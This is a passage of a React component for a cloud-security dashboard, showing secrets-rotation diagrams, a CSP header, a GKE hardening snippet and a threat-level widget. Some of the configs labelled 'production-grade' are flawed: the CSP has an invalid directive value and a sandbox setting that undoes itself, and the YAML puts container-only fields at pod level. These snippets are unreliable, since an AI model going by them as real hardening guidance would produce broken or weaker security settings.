                        {control.domain}
                      </span>
                    </div>

                    <div className="space-y-1 text-xs">
                      <div className="flex items-center gap-2">
                        <strong className="text-slate-200 block font-bold">{control.title}</strong>
                        <span className="text-[10px] font-mono text-slate-500">({control.requirement})</span>
                      </div>
                      <p className="text-[11px] text-slate-400 leading-relaxed font-semibold">
                        Architecture Verification Proof:
                      </p>
                      <p className="text-[11px] text-slate-300 italic leading-relaxed bg-slate-900 p-2.5 rounded border border-slate-850">
                        {control.architectureProof}
                      </p>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* D. Secrets & Key Vault Management */}
          {activeTab === "secrets_encryption" && (
            <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-6 backdrop-blur-sm space-y-6">
              <div className="border-b border-slate-800/60 pb-4">
                <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                  <Key className="w-5 h-5 text-amber-400" />
                  <span>Secrets Leakage Prevention & KMS Envelope Cryptography</span>
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Secrets are never checked into Git. We leverage Google Secret Manager coupled with weekly automatic KMS-based hardware-backed key rotations.
                </p>
              </div>

              {/* Secrets Flow Schematic */}
              <div className="bg-slate-950 border border-slate-850 p-4 rounded-xl space-y-4 font-mono text-xs">
                <span className="text-[10px] font-mono text-slate-500 uppercase block border-b border-slate-850 pb-2">Weekly Envelope Key Rotation Pipeline</span>
                
                <div className="flex flex-col md:flex-row items-center justify-between gap-4 py-2">
                  <div className="p-3 bg-slate-900 rounded border border-slate-800 text-center w-full space-y-1">
                    <span className="text-[9px] text-slate-500 block uppercase font-bold">Encrypted Column Data</span>
                    <strong className="text-indigo-400 text-[11px]">Passenger Name (PII)</strong>
                    <span className="text-[9px] text-slate-500 block">AES-256-GCM ciphertext</span>
                  </div>

                  <div className="text-slate-500">→ (Encrypted with DEK)</div>

                  <div className="p-3 bg-slate-900 rounded border border-slate-800 text-center w-full space-y-1 relative">
                    <span className="text-[9px] text-slate-500 block uppercase font-bold">Data Encryption Key (DEK)</span>
                    <strong className="text-amber-400 text-[11px]">Local Memory Key</strong>
                    <span className="text-[9px] text-slate-500 block">Wrapped inside HSM envelope</span>
                  </div>

                  <div className="text-slate-500">→ (Wrapped with KEK)</div>

                  <div className="p-3 bg-slate-900 rounded border border-slate-800 text-center w-full space-y-1">
                    <span className="text-[9px] text-slate-500 block uppercase font-bold">Key Encryption Key (KEK)</span>
                    <strong className="text-emerald-400 text-[11px]">GCP KMS Cloud Key</strong>
                    <span className="text-[9px] text-slate-500 block">Rotates automatically every 7 days</span>
                  </div>
                </div>

                <div className="bg-slate-900/60 p-3.5 border border-slate-850 rounded-lg space-y-1">
                  <div className="text-[10px] font-bold text-slate-300">Secret Injection Sequence:</div>
                  <ol className="list-decimal list-inside text-[10px] text-slate-450 space-y-1 leading-relaxed">
                    <li>CI/CD pipeline builds stateless container with zero baked-in API credentials.</li>
                    <li>Container binds to a service account identity verified via Workload Identity Federation.</li>
                    <li>During application boot phase, server fetches environment configurations directly from Google Secret Manager.</li>
                    <li>Zero secrets are written to local disk or logged into container standard error pipes.</li>
                  </ol>
                </div>
              </div>
            </div>
          )}

          {/* E. Technical Specs */}
          {activeTab === "specs" && (
            <div className="bg-slate-900/40 border border-slate-800 rounded-2xl p-6 backdrop-blur-sm space-y-4">
              <div className="border-b border-slate-800/60 pb-4">
                <h3 className="text-base font-bold text-slate-100 flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-teal-400" />
                  <span>Production Cybersecurity Engineering Specifications</span>
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Production-grade security configuration matrices utilized to harden cloud nodes, networks, and databases.
                </p>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="bg-slate-950 border border-slate-850 p-4 rounded-xl space-y-2">
                  <span className="text-[10px] font-mono text-indigo-400 uppercase font-bold block">Dynamic CSP Header Payload</span>
                  <pre className="text-[10px] text-slate-400 font-mono bg-slate-900/80 p-2.5 rounded overflow-x-auto leading-normal">
                    {`Content-Security-Policy: \n  default-src 'self'; \n  script-src 'self' 'nonce-r6anYod' 'strict-dynamic'; \n  style-src 'self' 'unsafe-inline'; \n  img-src 'self' data: referrerpolicy.no-referrer; \n  frame-ancestors 'none'; \n  sandbox allow-scripts allow-same-origin;`}
                  </pre>
                </div>

                <div className="bg-slate-950 border border-slate-850 p-4 rounded-xl space-y-2">
                  <span className="text-[10px] font-mono text-amber-400 uppercase font-bold block">GKE Container Hardening (gVisor)</span>
                  <pre className="text-[10px] text-slate-400 font-mono bg-slate-900/80 p-2.5 rounded overflow-x-auto leading-normal">
                    {`apiVersion: apps/v1\nkind: Deployment\nspec:\n  template:\n    spec:\n      runtimeClassName: gvisor\n      securityContext:\n        runAsNonRoot: true\n        allowPrivilegeEscalation: false\n        readOnlyRootFilesystem: true`}
                  </pre>
                </div>
              </div>
            </div>
          )}

        </div>

        {/* Right Side Info Panel / Threat Level */}
        <div className="lg:col-span-4 space-y-4">
          
          {/* Global Threat Level Indicator */}
          <div className="bg-slate-900/40 border border-slate-800 p-5 rounded-2xl space-y-4 relative overflow-hidden">
            <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest block border-b border-slate-850 pb-2">
              Enterprise Defcon Level
            </span>

            <div className="text-center py-4">
              <span className={`text-4xl font-black font-mono tracking-tight ${vulnerabilitiesCount > 0 ? "text-rose-500 animate-pulse" : "text-emerald-400"}`}>
                {vulnerabilitiesCount > 0 ? "DEFCON 2" : "DEFCON 5"}
              </span>
              <span className="text-xs text-slate-400 block mt-1 uppercase font-bold tracking-wider">
                {vulnerabilitiesCount > 0 ? "Active Infiltrations Logged" : "Standard Safe Status"}
              </span>
            </div>

            <div className="space-y-2">
              <div className="flex items-center justify-between text-[11px]">
                <span className="text-slate-400">Mitigation Shield Ratio</span>
                <span className={`font-mono font-bold ${vulnerabilitiesCount > 0 ? "text-rose-400" : "text-emerald-400"}`}>
                  {vulnerabilitiesCount > 0 ? `${(100 - (vulnerabilitiesCount * 5)).toFixed(1)}%` : "100.0%"}
                </span>
              </div>
              <div className="w-full bg-slate-950 rounded-full h-1.5 overflow-hidden">
                <div 
                  className={`h-full transition-all duration-500 ${vulnerabilitiesCount > 0 ? "bg-rose-500" : "bg-emerald-400"}`}
                  style={{ width: `${vulnerabilitiesCount > 0 ? Math.max(20, 100 - (vulnerabilitiesCount * 5)) : 100}%` }}
                />
              </div>
            </div>

            {vulnerabilitiesCount > 0 && (
              <div className="p-3 bg-rose-950/20 border border-rose-500/20 rounded-xl text-[10.5px] text-rose-400 leading-relaxed">
                Warning: Turning off core security controls compromises data integrity. Click the <strong>Hot Patch</strong> button in the header to instantly reactivate all shields.
              </div>
            )}
          </div>

          {/* Quick Cybersecurity Best Practice list */}
          <div className="bg-slate-900/40 border border-slate-800 p-5 rounded-2xl space-y-3 pt-4">
            <span className="text-[10px] font-mono text-slate-500 uppercase tracking-widest block border-b border-slate-850 pb-2">SecOps Standard Mandates</span>
            
            <ul className="space-y-2 text-[11px] text-slate-400">
              <li className="flex items-start gap-1.5 leading-normal">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
                <span>Zero hardcoded API secrets across all frontend & backend git targets.</span>
              </li>
              <li className="flex items-start gap-1.5 leading-normal">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
                <span>Strict CORS parameters restricting cross-origin resource requests to registered microservices.</span>
              </li>
              <li className="flex items-start gap-1.5 leading-normal">
                <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
                <span>Daily automated CVE scans on container dependencies and node packages.</span>
              </li>
            </ul>
          </div>

        </div>

      </div>

    </div>
  );
}
